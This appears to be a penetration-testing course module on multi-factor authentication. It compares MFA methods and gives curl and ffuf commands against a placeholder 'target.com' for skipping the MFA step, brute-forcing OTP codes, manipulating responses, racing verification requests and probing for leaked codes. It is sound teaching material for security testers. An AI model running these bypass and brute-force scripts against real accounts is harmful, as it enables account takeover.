# Multi-Factor Authentication Testing

## Unit 4: Authentication Testing — Topic 4

## 🎯 Overview

Multi-Factor Authentication (MFA) adds additional verification beyond passwords, significantly reducing unauthorized access. However, MFA implementations often contain bypasses that penetration testers must identify. This topic covers MFA types, common implementation flaws, and testing methodologies.

---

## 1. MFA Types and Mechanisms

```
┌──────────────────────────────────────────────────────────────┐
│                    MFA METHODS                                │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  SMS OTP          │  Code sent via text message              │
│  ────────────────┼──────────────────────────────────────── │
│  TOTP             │  Time-based app (Google Authenticator)   │
│  ────────────────┼──────────────────────────────────────── │
│  Push Notification│  Approve on mobile app (Duo, MS Auth)   │
│  ────────────────┼──────────────────────────────────────── │
│  Hardware Token   │  YubiKey, RSA SecurID                    │
│  ────────────────┼──────────────────────────────────────── │
│  Email OTP        │  Code sent via email                     │
│  ────────────────┼──────────────────────────────────────── │
│  Backup Codes     │  Pre-generated one-time codes            │
│  ────────────────┼──────────────────────────────────────── │
│  Biometric        │  Fingerprint, Face ID, Windows Hello     │
└──────────────────────────────────────────────────────────────┘
```

### Security Comparison

| Method | Security Level | Phishable? | Offline Attack? |
|--------|---------------|------------|-----------------|
| SMS OTP | ⚠️ Low | Yes (SIM swap) | No |
| Email OTP | ⚠️ Low | Yes (account compromise) | No |
| TOTP App | ✅ Medium | Yes (real-time relay) | No |
| Push | ✅ Medium | Yes (fatigue attacks) | No |
| Hardware Key | ✅ High | No (origin-bound) | No |
| WebAuthn/FIDO2 | ✅ Highest | No | No |

---

## 2. MFA Bypass Techniques

### Direct Navigation Bypass

```
┌──────────────────────────────────────────────────────────────┐
│              STEP SKIP BYPASS                                 │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Normal Flow:                                                │
│  /login → /mfa-verify → /dashboard                          │
│                                                              │
│  Bypass Attempt:                                              │
│  /login → (skip MFA) → /dashboard                           │
│                                                              │
│  Test: After successful password, navigate directly to       │
│  /dashboard without entering MFA code                        │
│                                                              │
│  If dashboard loads → MFA check is client-side only!         │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Step 1: Login with valid credentials
curl -c cookies.txt -X POST https://target.com/login \
  -d "username=test&password=validpass"

# Step 2: Skip MFA, go directly to dashboard
curl -b cookies.txt https://target.com/dashboard
# If accessible → MFA bypassed!

# Also try:
curl -b cookies.txt https://target.com/api/user/profile
curl -b cookies.txt https://target.com/settings
```

### OTP Brute Force

```bash
# 4-digit OTP = 10,000 possibilities
# 6-digit OTP = 1,000,000 possibilities

# Brute force 4-digit OTP
for code in $(seq -w 0000 9999); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -b cookies.txt -X POST https://target.com/mfa-verify \
    -d "otp=$code")
  if [ "$response" != "401" ]; then
    echo "Valid OTP: $code (HTTP $response)"
    break
  fi
done

# ffuf OTP brute force
seq -w 000000 999999 > otp-wordlist.txt
ffuf -u https://target.com/mfa-verify \
  -X POST -d "otp=FUZZ" \
  -b "session=abc123" -w otp-wordlist.txt \
  -fc 401 -rate 100

# Check for:
# • Rate limiting on OTP attempts
# • OTP lockout after N failures
# • OTP expiration time
# • OTP reuse (same code works twice?)
```

### Response Manipulation

```bash
# Intercept MFA response and modify
# Original: {"success": false, "error": "Invalid OTP"}
# Modified: {"success": true}

# In Burp Suite:
# 1. Enter wrong OTP
# 2. Intercept response
# 3. Change status_code to 200 or success to true
# 4. Forward modified response
# 5. Check if application trusts client-side response

# Also try changing HTTP status code:
# 403 → 200 in response
```

### Race Condition

```bash
# Send multiple MFA verification requests simultaneously
# Some implementations don't properly lock the session

# Using parallel curl
for code in 123456 234567 345678; do
  curl -X POST https://target.com/mfa-verify \
    -b cookies.txt -d "otp=$code" &
done
wait
```

---

## 3. SMS OTP Specific Attacks

```
┌──────────────────────────────────────────────────────────────┐
│              SMS OTP ATTACK VECTORS                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  SIM Swapping:                                               │
│  Attacker social engineers carrier to transfer victim's      │
│  phone number to attacker's SIM card                        │
│                                                              │
│  SS7 Interception:                                           │
│  Exploit telecom signaling protocol to intercept SMS         │
│                                                              │
│  OTP in Response:                                            │
│  Some apps return OTP in API response body/headers           │
│  Check response after requesting OTP!                        │
│                                                              │
│  OTP Forwarding:                                             │
│  Malicious apps with SMS permissions read incoming OTP       │
└──────────────────────────────────────────────────────────────┘
```

```bash
# Check if OTP is leaked in response
curl -v -X POST https://target.com/send-otp \
  -d "phone=+1234567890" 2>&1

# Look for OTP in:
# Response body: {"otp": "123456", "message": "OTP sent"}
# Response headers: X-OTP: 123456
# Debug headers: X-Debug-Code: 123456
```

---

## 4. TOTP Implementation Flaws

```bash
# TOTP secret exposure during setup
# Check if secret is in URL, response, or page source
curl https://target.com/mfa/setup -b cookies.txt
# Look for: otpauth://totp/... or base32 secret

# TOTP window testing
# Standard TOTP allows ±1 time window (30 sec each)
# Some implementations accept wider windows
# Test: Does a code from 5 minutes ago still work?

# TOTP not invalidated after use
# Test: Use the same TOTP code twice
# If second use succeeds → replay attack possible

# TOTP backup codes
# Often 8-character alphanumeric
# Test: Are they single-use?
# Test: How many backup codes exist? (brute-forceable?)
```

---

## 5. MFA Testing Checklist

```
┌──────────────────────────────────────────────────────────────┐
│              MFA TESTING CHECKLIST                             │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  □ Can MFA step be skipped by direct navigation?             │
│  □ Is OTP brute-forceable (no rate limit/lockout)?           │
│  □ Does OTP expire after reasonable time?                    │
│  □ Is OTP single-use (can't reuse same code)?               │
│  □ Is OTP leaked in response headers/body?                   │
│  □ Can MFA be disabled without re-authentication?            │
│  □ Are backup codes properly secured and single-use?         │
│  □ Does response manipulation bypass MFA?                    │
│  □ Is there a race condition in MFA verification?            │
│  □ Can MFA be bypassed via alternative login endpoints?      │
│  □ Is MFA enforced for API access too?                       │
│  □ Can MFA be removed via password reset flow?               │
│  □ Is the TOTP secret properly protected during setup?       │
│  □ Does "Remember this device" work securely?                │
└──────────────────────────────────────────────────────────────┘
```

---

## 📊 Summary Table

| Bypass Technique | Condition | Impact |
|-----------------|-----------|--------|
| Step skipping | Client-side MFA check | Full bypass |
| OTP brute force | No rate limiting | Full bypass |
| Response manipulation | Client trusts response | Full bypass |
| OTP in response | Debug/dev oversight | Full bypass |
| Race condition | Concurrent requests | Potential bypass |
| Backup code brute force | Weak codes, no lockout | Full bypass |
| Alternative endpoints | Inconsistent enforcement | Full bypass |

---

## ❓ Revision Questions

1. How does a step-skip MFA bypass work?
2. Why is SMS-based OTP considered the weakest MFA method?
3. What is MFA fatigue and how is it exploited?
4. How do you test whether OTP codes are properly rate-limited?
5. What should you check in the API response after requesting an OTP?
6. Why should MFA be enforced on API endpoints, not just the web UI?

---

*Previous: [03-password-policies.md](03-password-policies.md) | Next: [05-session-management.md](05-session-management.md)*

---

*[Back to README](../README.md)*
